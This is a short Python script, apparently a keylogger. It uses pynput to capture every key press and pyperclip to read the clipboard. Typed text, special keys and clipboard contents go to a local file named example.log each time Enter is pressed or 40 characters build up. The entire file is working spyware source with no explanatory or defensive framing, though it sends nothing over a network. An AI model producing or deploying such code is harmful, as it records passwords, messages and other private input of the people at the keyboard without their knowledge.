import pyperclip
import logging
from pynput import keyboard
from time import gmtime, strftime

logging.basicConfig(filename='example.log',level=logging.DEBUG, format='%(asctime)s | %(message)s')
logging.info('Started')

log_str = ''
special_keys = ['space', 'esc', 'ctrl', 'shift', 'enter', 'tab', 'caps_lock', 'alt', 'backspace', 'cmd', 'up', 'down', 'left', 'right']

def get_clipboard():
  return pyperclip.paste()

def special_key_filter(name):
  global special_keys
  global log_str
  for i, v in enumerate(special_keys):
    if (v in name):
      log_str += '+ {} +'.format(v)

def on_press(key):
  global log_str
  filtered_key = str(key).replace('\'', '')

  if ('Key.' in filtered_key):
    special_key_filter(filtered_key)
    print(filtered_key)
  else:
    log_str += filtered_key
    print(filtered_key)

  if key == keyboard.Key.enter or len(log_str) >= 40:
    if (get_clipboard() != ''):
      logging.info('current clipboard: ' + get_clipboard())
    logging.debug(log_str)
    log_str = ''

with keyboard.Listener( on_press = on_press ) as listener:
    listener.join()